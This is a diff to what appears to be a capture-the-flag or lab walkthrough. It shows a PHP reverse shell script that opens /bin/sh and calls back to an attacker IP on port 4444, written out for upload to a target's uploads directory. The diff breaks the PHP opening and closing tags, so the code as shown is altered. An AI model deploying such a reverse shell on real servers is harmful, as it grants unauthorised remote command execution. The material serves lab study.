@@ -43,7 +43,7 @@ http://10.128.129.128/uploads
 ### We upload a PHP reverse shell
 ```bash
 cat > rev.php << 'EOF'
-<?php
+<php
 set_time_limit(0);
 $ip = '192.168.160.214';  // Replace with your IP
 $port = 4444;
@@ -55,7 +55,7 @@ $descriptorspec = array(
 );
 $process = proc_open('/bin/sh', $descriptorspec, $pipes);
 proc_close($process);
-?>
+>
 EOF
 ```
 ### When trying to upload the reverse shell, it tells us that .php is not allowed 
